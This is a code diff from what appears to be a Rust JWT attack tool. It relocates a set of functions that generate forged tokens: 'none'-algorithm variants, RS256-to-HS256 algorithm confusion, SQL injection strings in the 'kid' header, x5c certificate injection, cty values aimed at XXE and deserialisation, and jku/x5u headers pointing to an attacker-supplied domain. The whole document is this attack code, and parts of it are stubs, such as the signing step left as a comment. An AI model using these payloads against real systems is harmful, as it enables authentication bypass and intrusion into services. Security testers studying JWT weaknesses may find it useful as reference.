@@ -126,6 +126,239 @@ pub fn generate_url_payload(
     Ok(payloads)
 }
 
+/// Generate algorithm confusion attacks (RS256->HS256)
+#[allow(dead_code)]
+pub fn generate_alg_confusion_payload(token: &str, public_key: Option<&str>) -> Result<Vec<String>> {
+    let mut payloads = Vec::new();
+    
+    // Split token parts
+    let parts: Vec<&str> = token.split('.').collect();
+    if parts.len() < 2 {
+        return Err(anyhow::anyhow!("Invalid token format"));
+    }
+
+    let claims_part = parts[1];
+    
+    // Default public key if none provided (for demonstration purposes)
+    let demo_pub_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo\n4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u\n+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh\nkd3qqGElvW/VDL5AaWTg0nLVkjRo9z+40RQzuVaE8AkAFmxZzow3x+VJYKdjykkJ\n0iT9wCS0DRTXu269V264Vf/3jvredZiKRkgwlL9xNAwxXFg0x/XFw005UWVRIkdg\ncKWTjpBP2dPwVZ4WWC+9aGVd+Gyn1o0CLelf4rEjGoXbAAEgAqeGUxrcIlbjXfbc\nmwIDAQAB\n-----END PUBLIC KEY-----";
+    
+    let _pub_key_str = match public_key {
+        Some(key) => key,
+        None => demo_pub_key
+    };
+    
+    // Try both changing the algorithm only and changing with the public key as secret
+    // 1. Basic alg change from RS256 to HS256
+    let header = json!({
+        "alg": "HS256",  // Changed from RS256 to HS256
+        "typ": "JWT" 
+    });
+    
+    let header_json = serde_json::to_string(&header)?;
+    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+    payloads.push(format!("{}.{}", encoded_header, claims_part));
+    
+    // 2. Using the public key as the HMAC secret
+    // This is a simplified example - in practice you'd need to hash the claims with the public key
+    // For a real attack, you'd base64 decode the public key and use it as the HMAC secret
+    
+    info!("Generated algorithm confusion payloads: RS256->HS256");
+    
+    Ok(payloads)
+}
+
+/// Generate kid header SQL injection payloads
+#[allow(dead_code)]
+pub fn generate_kid_sql_payload(token: &str) -> Result<Vec<String>> {
+    let mut payloads = Vec::new();
+    
+    // Split token parts
+    let parts: Vec<&str> = token.split('.').collect();
+    if parts.len() < 2 {
+        return Err(anyhow::anyhow!("Invalid token format"));
+    }
+
+    let claims_part = parts[1];
+    
+    // Common SQL injection patterns for kid parameter
+    let sql_injection_patterns = [
+        // SQLite injections
+        "' OR '1'='1", 
+        "' OR '1'='1' --",
+        "' UNION SELECT 'secret-key' --",
+        // MySQL injections
+        "' OR 1=1 #",
+        "' OR 1=1 -- -",
+        // Generic SQL injection
+        "x' UNION SELECT 'key",
+        // Using known key value
+        "key-0"
+    ];
+    
+    for pattern in sql_injection_patterns {
+        let header = json!({
+            "alg": "HS256",
+            "typ": "JWT",
+            "kid": pattern
+        });
+        
+        let header_json = serde_json::to_string(&header)?;
+        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+        payloads.push(format!("{}.{}", encoded_header, claims_part));
+    }
+    
+    info!("Generated kid SQL injection payloads");
+    
+    Ok(payloads)
+}
+
+/// Generate x5c header injection payloads
+#[allow(dead_code)]
+pub fn generate_x5c_payload(token: &str) -> Result<Vec<String>> {
+    let mut payloads = Vec::new();
+    
+    // Split token parts
+    let parts: Vec<&str> = token.split('.').collect();
+    if parts.len() < 2 {
+        return Err(anyhow::anyhow!("Invalid token format"));
+    }
+
+    let claims_part = parts[1];
+    
+    // Example self-signed certificates in base64 format
+    // In a real scenario, you'd generate these dynamically
+    let sample_certificates = [
+        vec!["MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA"],
+        vec!["MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA", "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2"]
+    ];
+    
+    for cert_chain in sample_certificates {
+        let header = json!({
+            "alg": "RS256",
+            "typ": "JWT",
+            "x5c": cert_chain
+        });
+        
+        let header_json = serde_json::to_string(&header)?;
+        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+        payloads.push(format!("{}.{}", encoded_header, claims_part));
+    }
+    
+    info!("Generated x5c header injection payloads");
+    
+    Ok(payloads)
+}
+
+/// Generate cty header manipulation payloads
+#[allow(dead_code)]
+pub fn generate_cty_payload(token: &str) -> Result<Vec<String>> {
+    let mut payloads = Vec::new();
+    
+    // Split token parts
+    let parts: Vec<&str> = token.split('.').collect();
+    if parts.len() < 2 {
+        return Err(anyhow::anyhow!("Invalid token format"));
+    }
+
+    let claims_part = parts[1];
+    
+    // Content types to try for XXE and deserialization attacks
+    let content_types = [
+        "text/xml",
+        "application/xml",
+        "application/x-java-serialized-object",
+        "application/json+x-jackson-smile"
+    ];
+    
+    for cty in content_types {
+        let header = json!({
+            "alg": "HS256", 
+            "typ": "JWT",
+            "cty": cty
+        });
+        
+        let header_json = serde_json::to_string(&header)?;
+        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+        payloads.push(format!("{}.{}", encoded_header, claims_part));
+    }
+    
+    info!("Generated cty header manipulation payloads");
+    
+    Ok(payloads)
+}
+
+/// Generate all available payloads for a token
+#[allow(dead_code)]
+pub fn generate_all_payloads(
+    token: &str,
+    jwk_trust: Option<&str>,
+    jwk_attack: Option<&str>,
+    jwk_protocol: &str,
+    target: Option<&str>,
+) -> Result<Vec<String>> {
+    let mut payloads = Vec::new();
+    
+    // Parse target parameter
+    let targets: std::collections::HashSet<String> = match target {
+        Some(t) => t.split(',')
+            .map(|s| s.trim().to_lowercase())
+            .collect(),
+        None => std::collections::HashSet::from(["all".to_string()])
+    };
+    
+    let should_generate_all = targets.contains("all");
+
+    // None algorithm payloads
+    if should_generate_all || targets.contains("none") {
+        payloads.push(generate_none_payload(token, "none")?);
+        payloads.push(generate_none_payload(token, "NonE")?);
+        payloads.push(generate_none_payload(token, "NONE")?);
+    }
+
+    // URL payloads if attack domain is provided
+    if let Some(attack_domain) = jwk_attack {
+        // JKU payloads
+        if should_generate_all || targets.contains("jku") {
+            let jku_payloads =
+                generate_url_payload(token, "jku", attack_domain, jwk_trust, jwk_protocol)?;
+            payloads.extend(jku_payloads);
+        }
+
+        // X5U payloads
+        if should_generate_all || targets.contains("x5u") {
+            let x5u_payloads =
+                generate_url_payload(token, "x5u", attack_domain, jwk_trust, jwk_protocol)?;
+            payloads.extend(x5u_payloads);
+        }
+    }
+    
+    // Algorithm confusion payloads
+    if should_generate_all || targets.contains("alg_confusion") {
+        let alg_confusion_payloads = generate_alg_confusion_payload(token, None)?;
+        payloads.extend(alg_confusion_payloads);
+    }
+    
+    // kid SQL injection payloads
+    if should_generate_all || targets.contains("kid_sql") {
+        let kid_sql_payloads = generate_kid_sql_payload(token)?;
+        payloads.extend(kid_sql_payloads);
+    }
+    
+    // x5c header injection payloads
+    if should_generate_all || targets.contains("x5c") {
+        let x5c_payloads = generate_x5c_payload(token)?;
+        payloads.extend(x5c_payloads);
+    }
+    
+    // cty header manipulation payloads
+    if should_generate_all || targets.contains("cty") {
+        let cty_payloads = generate_cty_payload(token)?;
+        payloads.extend(cty_payloads);
+    }
+
+    Ok(payloads)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -415,237 +648,4 @@ mod tests {
             false
         }));
     }
-}
-
-/// Generate algorithm confusion attacks (RS256->HS256)
-#[allow(dead_code)]
-pub fn generate_alg_confusion_payload(token: &str, public_key: Option<&str>) -> Result<Vec<String>> {
-    let mut payloads = Vec::new();
-    
-    // Split token parts
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-
-    let claims_part = parts[1];
-    
-    // Default public key if none provided (for demonstration purposes)
-    let demo_pub_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo\n4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u\n+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh\nkd3qqGElvW/VDL5AaWTg0nLVkjRo9z+40RQzuVaE8AkAFmxZzow3x+VJYKdjykkJ\n0iT9wCS0DRTXu269V264Vf/3jvredZiKRkgwlL9xNAwxXFg0x/XFw005UWVRIkdg\ncKWTjpBP2dPwVZ4WWC+9aGVd+Gyn1o0CLelf4rEjGoXbAAEgAqeGUxrcIlbjXfbc\nmwIDAQAB\n-----END PUBLIC KEY-----";
-    
-    let _pub_key_str = match public_key {
-        Some(key) => key,
-        None => demo_pub_key
-    };
-    
-    // Try both changing the algorithm only and changing with the public key as secret
-    // 1. Basic alg change from RS256 to HS256
-    let header = json!({
-        "alg": "HS256",  // Changed from RS256 to HS256
-        "typ": "JWT" 
-    });
-    
-    let header_json = serde_json::to_string(&header)?;
-    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-    payloads.push(format!("{}.{}", encoded_header, claims_part));
-    
-    // 2. Using the public key as the HMAC secret
-    // This is a simplified example - in practice you'd need to hash the claims with the public key
-    // For a real attack, you'd base64 decode the public key and use it as the HMAC secret
-    
-    info!("Generated algorithm confusion payloads: RS256->HS256");
-    
-    Ok(payloads)
-}
-
-/// Generate kid header SQL injection payloads
-#[allow(dead_code)]
-pub fn generate_kid_sql_payload(token: &str) -> Result<Vec<String>> {
-    let mut payloads = Vec::new();
-    
-    // Split token parts
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-
-    let claims_part = parts[1];
-    
-    // Common SQL injection patterns for kid parameter
-    let sql_injection_patterns = [
-        // SQLite injections
-        "' OR '1'='1", 
-        "' OR '1'='1' --",
-        "' UNION SELECT 'secret-key' --",
-        // MySQL injections
-        "' OR 1=1 #",
-        "' OR 1=1 -- -",
-        // Generic SQL injection
-        "x' UNION SELECT 'key",
-        // Using known key value
-        "key-0"
-    ];
-    
-    for pattern in sql_injection_patterns {
-        let header = json!({
-            "alg": "HS256",
-            "typ": "JWT",
-            "kid": pattern
-        });
-        
-        let header_json = serde_json::to_string(&header)?;
-        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{}.{}", encoded_header, claims_part));
-    }
-    
-    info!("Generated kid SQL injection payloads");
-    
-    Ok(payloads)
-}
-
-/// Generate x5c header injection payloads
-#[allow(dead_code)]
-pub fn generate_x5c_payload(token: &str) -> Result<Vec<String>> {
-    let mut payloads = Vec::new();
-    
-    // Split token parts
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-
-    let claims_part = parts[1];
-    
-    // Example self-signed certificates in base64 format
-    // In a real scenario, you'd generate these dynamically
-    let sample_certificates = [
-        vec!["MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA"],
-        vec!["MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA", "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2"]
-    ];
-    
-    for cert_chain in sample_certificates {
-        let header = json!({
-            "alg": "RS256",
-            "typ": "JWT",
-            "x5c": cert_chain
-        });
-        
-        let header_json = serde_json::to_string(&header)?;
-        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{}.{}", encoded_header, claims_part));
-    }
-    
-    info!("Generated x5c header injection payloads");
-    
-    Ok(payloads)
-}
-
-/// Generate cty header manipulation payloads
-#[allow(dead_code)]
-pub fn generate_cty_payload(token: &str) -> Result<Vec<String>> {
-    let mut payloads = Vec::new();
-    
-    // Split token parts
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-
-    let claims_part = parts[1];
-    
-    // Content types to try for XXE and deserialization attacks
-    let content_types = [
-        "text/xml",
-        "application/xml",
-        "application/x-java-serialized-object",
-        "application/json+x-jackson-smile"
-    ];
-    
-    for cty in content_types {
-        let header = json!({
-            "alg": "HS256", 
-            "typ": "JWT",
-            "cty": cty
-        });
-        
-        let header_json = serde_json::to_string(&header)?;
-        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        payloads.push(format!("{}.{}", encoded_header, claims_part));
-    }
-    
-    info!("Generated cty header manipulation payloads");
-    
-    Ok(payloads)
-}
-
-/// Generate all available payloads for a token
-#[allow(dead_code)]
-pub fn generate_all_payloads(
-    token: &str,
-    jwk_trust: Option<&str>,
-    jwk_attack: Option<&str>,
-    jwk_protocol: &str,
-    target: Option<&str>,
-) -> Result<Vec<String>> {
-    let mut payloads = Vec::new();
-    
-    // Parse target parameter
-    let targets: std::collections::HashSet<String> = match target {
-        Some(t) => t.split(',')
-            .map(|s| s.trim().to_lowercase())
-            .collect(),
-        None => std::collections::HashSet::from(["all".to_string()])
-    };
-    
-    let should_generate_all = targets.contains("all");
-
-    // None algorithm payloads
-    if should_generate_all || targets.contains("none") {
-        payloads.push(generate_none_payload(token, "none")?);
-        payloads.push(generate_none_payload(token, "NonE")?);
-        payloads.push(generate_none_payload(token, "NONE")?);
-    }
-
-    // URL payloads if attack domain is provided
-    if let Some(attack_domain) = jwk_attack {
-        // JKU payloads
-        if should_generate_all || targets.contains("jku") {
-            let jku_payloads =
-                generate_url_payload(token, "jku", attack_domain, jwk_trust, jwk_protocol)?;
-            payloads.extend(jku_payloads);
-        }
-
-        // X5U payloads
-        if should_generate_all || targets.contains("x5u") {
-            let x5u_payloads =
-                generate_url_payload(token, "x5u", attack_domain, jwk_trust, jwk_protocol)?;
-            payloads.extend(x5u_payloads);
-        }
-    }
-    
-    // Algorithm confusion payloads
-    if should_generate_all || targets.contains("alg_confusion") {
-        let alg_confusion_payloads = generate_alg_confusion_payload(token, None)?;
-        payloads.extend(alg_confusion_payloads);
-    }
-    
-    // kid SQL injection payloads
-    if should_generate_all || targets.contains("kid_sql") {
-        let kid_sql_payloads = generate_kid_sql_payload(token)?;
-        payloads.extend(kid_sql_payloads);
-    }
-    
-    // x5c header injection payloads
-    if should_generate_all || targets.contains("x5c") {
-        let x5c_payloads = generate_x5c_payload(token)?;
-        payloads.extend(x5c_payloads);
-    }
-    
-    // cty header manipulation payloads
-    if should_generate_all || targets.contains("cty") {
-        let cty_payloads = generate_cty_payload(token)?;
-        payloads.extend(cty_payloads);
-    }
-
-    Ok(payloads)
 }
